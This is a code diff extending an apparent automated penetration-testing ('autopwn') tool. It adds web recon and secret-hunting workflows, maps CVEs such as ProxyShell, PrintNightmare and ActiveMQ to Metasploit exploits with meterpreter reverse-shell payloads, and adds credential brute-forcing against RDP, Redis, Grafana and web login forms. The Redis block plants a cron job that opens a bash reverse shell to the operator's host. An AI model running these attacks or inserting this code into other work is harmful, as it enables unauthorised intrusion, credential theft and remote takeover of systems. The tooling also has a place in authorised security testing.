@@ -312,20 +312,30 @@ WORKFLOWS = [
             {"name": "Nmap UDP Top-20 + SNMP", "command": "nmap -T4 -sU --top-ports 20 --max-retries 1 --script=snmp-info,snmp-sysdescr {rhost} 2>/dev/null", "parse": "nmap"},
             {"name": "WhatWeb + HTTP Tech Detection", "command": "whatweb http://{rhost} https://{rhost} 2>/dev/null; curl -sI --max-time 8 http://{rhost} 2>/dev/null | head -20; curl -sI --max-time 8 https://{rhost} 2>/dev/null | head -20"},
             {"name": "SMB Quick Enum", "command": "crackmapexec smb {rhost} 2>/dev/null; smbclient -L //{rhost} -N 2>/dev/null; smbmap -H {rhost} 2>/dev/null | head -20"},
-            {"name": "Web Directory Fuzz (ffuf/gobuster)", "command": "WLIST=$(ls /usr/share/wordlists/dirb/common.txt /usr/share/seclists/Discovery/Web-Content/common.txt 2>/dev/null | head -1); [ -n \"$WLIST\" ] && (ffuf -u 'http://{rhost}/FUZZ' -w $WLIST -t 40 -mc 200,204,301,302,307,401,403 -fc 404 -timeout 8 -s 2>/dev/null | head -40 || gobuster dir -u http://{rhost} -w $WLIST -t 30 -q --timeout 8s 2>/dev/null | head -30)"},
+            {"name": "Web Directory Fuzz (feroxbuster/ffuf/gobuster)", "command": "WLIST=$(ls /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt /usr/share/wordlists/dirb/common.txt 2>/dev/null | head -1); [ -n \"$WLIST\" ] && (feroxbuster --url http://{rhost} -k -w $WLIST -t 40 -x php,html,txt,asp,aspx,jsp,bak,zip,json,config -q --no-state 2>/dev/null | head -60 || ffuf -u 'http://{rhost}/FUZZ' -w $WLIST -t 40 -mc 200,204,301,302,307,401,403 -fc 404 -timeout 8 -s 2>/dev/null | head -50 || gobuster dir -u http://{rhost} -w $WLIST -t 30 -q --timeout 8s 2>/dev/null | head -40)"},
+            {"name": "Nuclei CVE + Misconfig Scan", "command": "nuclei -u http://{rhost} -u https://{rhost} -severity critical,high,medium -j -timeout 12 -no-color -no-update-check 2>/dev/null | head -80 || nuclei -u http://{rhost} -severity critical,high -j 2>/dev/null | head -60", "parse": "nuclei"},
+            {"name": "JS Secrets + API Endpoints", "command": "URLS=$(curl -s --max-time 10 http://{rhost} 2>/dev/null | grep -oE 'src=\"[^\"]*\\.js[^\"]*\"' | sed 's/src=\"//;s/\"//'); for u in $URLS; do [ -z \"$(echo $u | grep -E '^http')\" ] && u=\"http://{rhost}/$u\"; curl -s --max-time 8 \"$u\" 2>/dev/null | grep -oiE '(api[_-]?key|apikey|secret[_-]?key|access[_-]?token|aws[_-]?secret|client[_-]?secret)[^\\s\"]{0,80}' | head -5; done 2>/dev/null | head -30"},
+            {"name": "HTTP Security Headers Check", "command": "for proto in http https; do echo \"=== $proto://{rhost} ===\"; curl -sI --max-time 8 $proto://{rhost} 2>/dev/null | grep -iE 'server:|x-powered-by:|strict-transport|x-frame|content-security|x-content-type|referrer-policy'; done"},
+            {"name": "Sensitive Files + Backup Check", "command": "for f in /.env /.git/HEAD /backup.zip /backup.tar.gz /db.sql /config.php /wp-config.php /web.config /.htaccess /robots.txt /sitemap.xml /crossdomain.xml /phpinfo.php /info.php /.DS_Store; do CODE=$(curl -sk --max-time 6 -o /dev/null -w '%{http_code}' http://{rhost}$f 2>/dev/null); [ \"$CODE\" = '200' ] && echo \"BACKUP_FILE_FOUND:$f (HTTP $CODE)\"; done"},
+            {"name": "Cloud Metadata SSRF Probe", "command": "for path in /latest/meta-data/ /computeMetadata/v1/ /metadata/instance?api-version=2021-02-01; do for target_url in http://169.254.169.254$path http://metadata.google.internal$path; do R=$(curl -sk --max-time 5 \"$target_url\" -H 'Metadata-Flavor: Google' 2>/dev/null | head -5); [ -n \"$R\" ] && echo \"CLOUD_METADATA_INTERNAL: $target_url\" && echo \"$R\" | head -3; done; done 2>/dev/null | head -20"},
+            {"name": "Spring Boot Actuator Discovery", "command": "for path in /actuator /actuator/env /actuator/health /actuator/info /actuator/mappings /actuator/beans /actuator/heapdump /actuator/httptrace /actuator/loggers; do CODE=$(curl -sk --max-time 6 -o /dev/null -w '%{http_code}' http://{rhost}$path 2>/dev/null); [ \"$CODE\" = '200' ] && echo \"ACTUATOR_EXPOSED: $path (HTTP $CODE)\"; done"},
         ],
     },
     {
         "id": "web_enum",
         "name": "Web Enumeration",
-        "description": "WhatWeb + Gobuster dirs/vhosts + Nikto automático.",
+        "description": "WhatWeb + Feroxbuster + Gobuster dirs/vhosts + Nikto + Nuclei.",
         "icon": "fa-globe",
         "color": "orange",
         "steps": [
             {"name": "WhatWeb", "command": "whatweb http://{rhost} https://{rhost} 2>/dev/null"},
+            {"name": "Feroxbuster Deep", "command": "WLIST=$(ls /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt /usr/share/wordlists/dirb/common.txt 2>/dev/null | head -1); feroxbuster --url http://{rhost} -k -w $WLIST -t 50 -x php,html,txt,asp,aspx,jsp,bak,zip,json,config,env -q --no-state 2>/dev/null | head -80"},
             {"name": "Gobuster dirs", "command": "gobuster dir -u http://{rhost} -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,html,txt,asp,aspx -q"},
             {"name": "Gobuster vhosts", "command": "gobuster vhost -u http://{rhost} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 40 -q 2>/dev/null"},
-            {"name": "Nikto", "command": "nikto -h http://{rhost} -C all 2>/dev/null"},
+            {"name": "Nikto Full Scan", "command": "nikto -h http://{rhost} -C all -maxtime 300 2>/dev/null"},
+            {"name": "Nuclei Web CVE Scan", "command": "nuclei -u http://{rhost} -u https://{rhost} -severity critical,high,medium -j -no-update-check 2>/dev/null | head -80", "parse": "nuclei"},
+            {"name": "SQLMap Auto-Detect", "command": "sqlmap -u 'http://{rhost}' --forms --crawl=2 --batch --level=2 --risk=1 --output-dir=/tmp/sqlmap_{rhost} 2>/dev/null | tail -20"},
+            {"name": "CORS Misconfig Check", "command": "curl -sk --max-time 8 -H 'Origin: https://evil.com' -I 'http://{rhost}' 2>/dev/null | grep -i 'access-control'"},
         ],
     },
     {
@@ -4525,6 +4535,69 @@ AUTOPWN_MSF_MAP = [
         "module": "exploit/windows/smb/smb_doublepulsar_rce",
         "options": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp"},
         "desc": "DoublePulsar SMB Backdoor RCE",
+    },
+    {
+        "id": "activemq_cve_2023_46604",
+        "triggers": ["activemq", "cve-2023-46604", "61616", "activemq rce"],
+        "module": "exploit/multi/misc/apache_activemq_rce_cve_2023_46604",
+        "options": {"RPORT": "61616", "PAYLOAD": "java/meterpreter/reverse_tcp"},
+        "desc": "Apache ActiveMQ RCE CVE-2023-46604",
+    },
+    {
+        "id": "teamcity_cve_2023_42793",
+        "triggers": ["teamcity", "cve-2023-42793", "teamcity auth bypass"],
+        "module": "exploit/multi/http/jetbrains_teamcity_rce_cve_2023_42793",
+        "options": {"PAYLOAD": "linux/x64/meterpreter/reverse_tcp"},
+        "desc": "TeamCity Auth Bypass + RCE CVE-2023-42793",
+    },
+    {
+        "id": "vmware_vcenter_rce",
+        "triggers": ["vcenter", "vmware vcenter", "cve-2021-21985", "vsphere"],
+        "module": "exploit/linux/http/vmware_vcenter_rce",
+        "options": {"RPORT": "443", "SSL": "true", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp"},
+        "desc": "VMware vCenter RCE CVE-2021-21985",
+    },
+    {
+        "id": "cacti_cmd_injection",
+        "triggers": ["cacti", "cve-2022-46169", "cacti command injection"],
+        "module": "exploit/linux/http/cacti_unauthenticated_cmd_injection",
+        "options": {"PAYLOAD": "linux/x64/meterpreter/reverse_tcp"},
+        "desc": "Cacti Unauthenticated Command Injection CVE-2022-46169",
+    },
+    {
+        "id": "solr_velocity_rce",
+        "triggers": ["apache solr", "solr", "cve-2019-17558", "8983"],
+        "module": "exploit/multi/http/solr_velocity_rce",
+        "options": {"RPORT": "8983", "PAYLOAD": "linux/x64/meterpreter/reverse_tcp"},
+        "desc": "Apache Solr Velocity Template RCE CVE-2019-17558",
+    },
+    {
+        "id": "kibana_timelion_rce",
+        "triggers": ["kibana", "cve-2019-7609", "5601", "timelion"],
+        "module": "exploit/multi/http/kibana_timelion_prototype_pollution",
+        "options": {"RPORT": "5601", "PAYLOAD": "nodejs/shell_reverse_tcp"},
+        "desc": "Kibana Timelion Prototype Pollution RCE CVE-2019-7609",
+    },
+    {
+        "id": "grafana_directory_traversal",
+        "triggers": ["grafana", "cve-2021-43798", "grafana traversal"],
+        "module": "auxiliary/scanner/http/grafana_plugin_traversal",
+        "options": {"RPORT": "3000"},
+        "desc": "Grafana Directory Traversal CVE-2021-43798",
+    },
+    {
+        "id": "proxyshell",
+        "triggers": ["exchange", "proxyshell", "cve-2021-34473", "cve-2021-34523"],
+        "module": "exploit/windows/http/exchange_proxyshell_rce",
+        "options": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp", "SSL": "true"},
+        "desc": "Exchange ProxyShell RCE CVE-2021-34473",
+    },
+    {
+        "id": "printspooler_nightmare",
+        "triggers": ["printnightmare", "cve-2021-34527", "print spooler", "spoolss"],
+        "module": "exploit/windows/dcerpc/cve_2021_1675_printspooler",
+        "options": {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp"},
+        "desc": "PrintNightmare Print Spooler LPE/RCE CVE-2021-34527",
     },
 ]
 
@@ -9457,6 +9530,90 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                             "description": f"Superuser PostgreSQL → COPY TO PROGRAM → RCE.\n{rce_out[:200]}",
                             "cve": "",
                         }], target)
+            # RDP (3389) — xfreerdp brute force
+            if 3389 in port_set:
+                out, _ = self._run_cmd(
+                    f"cred-rdp-{user}",
+                    f"xfreerdp /v:{target} /u:'{user}' /p:'{pwd}' /cert-ignore /timeout:8000 "
+                    f"/log-level:ERROR +auth-only 2>/dev/null && echo 'RDP_LOGIN_SUCCESS:{user}:{pwd}' || true",
+                    target, timeout=15,
+                )
+                self._capture_evidence(out, target, f"cred-rdp-{user}", f"rdp {user}")
+                if "RDP_LOGIN_SUCCESS" in out:
+                    accumulated_output.append(f"=== RDP {user} ===\n{out[:400]}")
+                    self._save_findings([{
+                        "title": f"RDP — Credenciales Válidas: {user} @ {target}:3389",
+                        "severity": "critical",
+                        "description": f"xfreerdp confirma acceso RDP con {user}:{pwd[:4]}*** — usar rdesktop o xfreerdp para sesión.",
+                        "cve": "",
+                    }], target)
+            # Redis (6379) with auth — try cred as password
+            if 6379 in port_set:
+                out, _ = self._run_cmd(
+                    f"cred-redis-{user}",
+                    f"redis-cli -h {target} -a '{pwd}' ping 2>/dev/null && echo 'REDIS_AUTH_SUCCESS:{user}:{pwd}' || true",
+                    target, timeout=10,
+                )
+                if "REDIS_AUTH_SUCCESS" in out or "PONG" in out:
+                    accumulated_output.append(f"=== Redis auth {user} ===\n{out[:200]}")
+                    # Try RCE via cron
+                    rce_out, _ = self._run_cmd(
+                        f"redis-rce-cron-{user}",
+                        f"redis-cli -h {target} -a '{pwd}' config set dir /var/spool/cron/crontabs 2>/dev/null; "
+                        f"redis-cli -h {target} -a '{pwd}' config set dbfilename root 2>/dev/null; "
+                        f"redis-cli -h {target} -a '{pwd}' set pwn \"\\n\\n* * * * * bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1\\n\\n\" 2>/dev/null; "
+                        f"redis-cli -h {target} -a '{pwd}' save 2>/dev/null; "
+                        f"echo 'REDIS_CRON_RCE_ATTEMPTED'",
+                        target, timeout=15,
+                    )
+                    accumulated_output.append(f"=== Redis RCE {user} ===\n{rce_out[:300]}")
+            # Grafana (3000) — try as admin creds
+            if 3000 in port_set:
+                out, _ = self._run_cmd(
+                    f"cred-grafana-{user}",
+                    f"curl -s --max-time 8 -u '{user}:{pwd}' 'http://{target}:3000/api/org' 2>/dev/null | "
+                    f"grep -q '\"id\"' && echo 'GRAFANA_CREDS_VALID:{user}:{pwd}' || true",
+                    target, timeout=12,
+                )
+                if "GRAFANA_CREDS_VALID" in out:
+                    accumulated_output.append(f"=== Grafana {user} ===\n{out[:200]}")
+                    self._save_findings([{
+                        "title": f"Grafana — Credenciales Válidas: {user} @ {target}:3000",
+                        "severity": "critical",
+                        "description": f"Grafana acepta {user}:{pwd[:4]}***. Acceso total al panel.",
+                        "cve": "",
+                    }], target)
+            # HTTP Form brute (common login forms)
+            http_ports_check = [p for p in open_ports if p["port"] in (80, 443, 8080, 8443, 8000)]
+            for _hp in http_ports_check[:2]:
+                _hport = _hp["port"]
+                _hproto = "https" if _hport in (443, 8443) else "http"
+                _form_out, _ = self._run_cmd(
+                    f"cred-http-form-{user}-{_hport}",
+                    f"for path in /login /admin/login /wp-login.php /user/login /signin /auth/login /panel /dashboard/login; do "
+                    f"  CODE=$(curl -sk --max-time 8 -o /dev/null -w '%{{http_code}}' '{_hproto}://{target}:{_hport}$path' 2>/dev/null); "
+                    f"  if [ \"$CODE\" = '200' ] || [ \"$CODE\" = '302' ]; then "
+                    f"    # Try POST with common field names\n"
+                    f"    for fields in 'username={user}&password={pwd}' 'user={user}&pass={pwd}' 'login={user}&password={pwd}' 'email={user}&password={pwd}'; do "
+                    f"      R=$(curl -sk --max-time 8 -c /tmp/cred_jar_{user}_{_hport} -X POST "
+                    f"        '{_hproto}://{target}:{_hport}$path' -d \"$fields\" "
+                    f"        -H 'Content-Type: application/x-www-form-urlencoded' "
+                    f"        -L 2>/dev/null | grep -iE 'logout|dashboard|welcome|admin panel|profile|account' | head -2); "
+                    f"      [ -n \"$R\" ] && echo \"HTTP_FORM_LOGIN_SUCCESS:{user}:{pwd}:$path\" && break 2; "
+                    f"    done; "
+                    f"  fi; "
+                    f"done",
+                    target, timeout=25,
+                )
+                if "HTTP_FORM_LOGIN_SUCCESS" in _form_out:
+                    _path_m = re.search(r'HTTP_FORM_LOGIN_SUCCESS:[^:]+:[^:]+:(\S+)', _form_out)
+                    accumulated_output.append(f"=== HTTP Form {_hport} {user} ===\n{_form_out[:400]}")
+                    self._save_findings([{
+                        "title": f"Web — Login Form Bypass con Credenciales: {user} @ {_hproto}://{target}:{_hport}{_path_m.group(1) if _path_m else ''}",
+                        "severity": "critical",
+                        "description": f"Login form acepta {user}:{pwd[:4]}***. Acceso al panel de administración.",
+                        "cve": "",
+                    }], target)
 
     def _run_kb_phase(self, target, open_ports, accumulated_output):
         """Run highest-priority KB commands for each discovered service."""
